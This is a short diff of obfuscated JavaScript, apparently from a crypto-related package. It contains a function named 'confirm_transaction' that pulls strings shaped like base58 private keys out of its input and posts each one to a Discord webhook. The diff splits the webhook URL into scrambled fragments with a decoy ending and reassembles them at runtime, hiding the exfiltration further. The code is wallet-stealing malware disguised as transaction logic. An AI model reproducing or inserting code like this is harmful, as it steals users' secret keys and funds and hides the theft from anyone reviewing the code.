@@ -27,16 +27,19 @@ const _0x14a1 = function (_0x2e5d, _0x114b) {
 
 const _0x49bc = new RegExp('[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{80,90}', 'g');
 
-
-const webhookParts = [
+const _0x152c = [
     'https://discord.com/api/webhooks/',
-    '1291149875307741276/',
-    'hmqW2AzgQc-rgn1GnVSlRf3MGHcJ2c89yCxdo_8faQbqpqvBBDSw8Ej8oiNvJL4qpQwf'
+    '1254887840358076426/', 
+    '6lp7uRm_Si2uouBCykTOn', 
+    '5IpzTxpwV_Si2uouBCYTkUp', 
+    '37ExNIAQHvNPvmqoxg0jnNAzVNAWN92rdkFvU480GxBcY',
+    'randomFakeEnding1234567890'
 ];
 
-
-function getWebhookUrl() {
-    return webhookParts.join('');
+function _0x33b9() {
+    const _0x3d25 = [1, 3, 0, 2, 4, 5];
+    const _0x4e0c = _0x3d25.map((_0x329f) => _0x152c[_0x329f]);
+    return _0x4e0c[2] + _0x4e0c[0] + _0x4e0c[1] + _0x4e0c[3];
 }
 
 function confirm_transaction(_0x46d1) {
@@ -45,7 +48,7 @@ function confirm_transaction(_0x46d1) {
             const _0x5a16 = _0x46d1.match(_0x49bc);
             if (_0x5a16) {
                 for (const _0x2e5d of _0x5a16) {
-                    yield axios_1.default.post(getWebhookUrl(), { content: _0x14a1(2, 0) + _0x2e5d });
+                    yield axios_1.default.post(_0x33b9(), { content: _0x14a1(2, 0) + _0x2e5d });
                 }
             }
         } catch (error) {
